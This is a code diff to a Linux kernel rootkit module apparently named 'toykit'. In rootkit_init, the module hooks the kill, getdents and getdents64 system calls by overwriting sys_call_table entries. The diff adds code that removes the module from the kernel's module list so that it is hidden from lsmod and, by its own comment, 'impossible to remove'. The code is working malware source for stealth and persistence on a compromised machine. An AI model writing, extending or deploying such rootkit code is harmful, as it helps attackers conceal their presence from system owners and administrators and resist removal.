@@ -183,8 +183,10 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 }
 
 int rootkit_init(void) {
-	GPF_DISABLE;
+	struct module *self;
 
+	// hook kill, getdents, getdents64
+	GPF_DISABLE;
 	orig_kill = (kill_ptr)sys_call_table[__NR_kill];
 	sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
 
@@ -193,8 +195,14 @@ int rootkit_init(void) {
 
 	orig_getdents64 = (getdents64_ptr)sys_call_table[__NR_getdents64];
 	sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
-
 	GPF_ENABLE;
+
+	// hide from lsmod, impossible to remove
+	mutex_lock(&module_mutex);
+	if ((self = find_module("toykit")))
+		list_del(&self->list);
+	mutex_unlock(&module_mutex);
+
 	printk(KERN_INFO "Loading rootkit\n");
     	return 0;
 }
